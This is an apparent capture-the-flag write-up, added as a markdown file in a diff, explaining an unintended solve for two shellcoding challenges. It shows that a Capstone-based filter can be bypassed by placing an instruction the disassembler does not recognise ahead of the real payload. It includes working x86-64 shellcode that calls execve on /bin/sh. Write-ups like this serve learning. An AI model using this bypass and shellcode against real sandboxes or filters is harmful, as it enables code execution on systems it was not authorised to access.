@@ -1,0 +1,55 @@
+# code-cruncher
+
+The actual specifics of the challenge do not really matter, I just want to discuss an unintended I found to solve both shellcoding challenges.
+
+```c open
+    int64_t var_138
+    int64_t rax_6 = cs_disasm(var_130, &buf, sx.q(rax_1), _init, 0, &var_138)
+    int64_t var_28 = 0
+    
+    if (rax_6 == 0)
+        puts(str: "Error: Unable to disassemble she…")
+        cs_close(&var_130)
+        exit(status: 1)
+        noreturn
+```
+
+The challenge author (LMS) made the assumption that `cs_disasm` returns `NULL` if it fails to disassemble the provided bytes (e.g. it returns `NULL` when it encounters an invalid instruction). However this is not the case :D. The return value of `cs_disasm`, by default is the number of instructions it was able to successfully disassemble. Capstone does not actually care about invalid instructions and instead of returning an error simply stops disassembling once it reaches them.
+
+We can exploit this by sending shellcode to the effect of:
+```x86asm filename="solve.asm" open
+    bits 64
+    default rel
+    global _start
+
+_start:
+    vzeroupper
+    ; capstone does not know this instruction exists
+    ; and believes it is invalid, however on real hardware
+    ; rdsspq is effectively a nop
+    rdsspq     rax
+next:
+    mov eax, 0x3b
+    lea rdi, [shell]
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+shell: db "/bin/sh", 0
+```
+
+The solve for shellwiz is slightly different but also abuses invalid instructions to bypass the challenge restrictions:
+```x86asm filename="solve.asm" open
+;;; solve for shellwiz
+    jmp payload
+invalid:
+    ; invalid instruction in 64 bit mode
+    db 0x06
+payload:
+    mov eax, 0x3b
+    lea rdi, [shell]
+    xor esi, esi
+    xor edx, edx
+    syscall
+shell: db "/bin/sh", 0
+```
